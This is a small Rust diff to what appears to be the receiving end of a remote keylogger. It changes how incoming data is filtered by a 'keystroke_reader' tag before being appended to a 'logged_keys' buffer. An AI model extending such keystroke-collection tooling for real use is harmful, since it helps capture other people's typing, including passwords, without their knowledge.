@@ -59,8 +59,11 @@ where
             match event {
                 ClientEvent::Connected(addr) => { app.client_addr = addr.to_string() },
                 ClientEvent::Data(bytes) => { 
-                    let key = std::str::from_utf8(&bytes).expect("cannot decode bytes to str");
-                    app.logged_keys.push_str(key); 
+                    let data = std::str::from_utf8(&bytes).expect("cannot decode bytes to str");
+                    if data.ends_with("keystroke_reader") {
+                        let key = data.replace("keystroke_reader", "");
+                        app.logged_keys.push_str(key.as_str());
+                    };
                 },
                 ClientEvent::Disconnected => { app.client_addr = String::new() },
             }
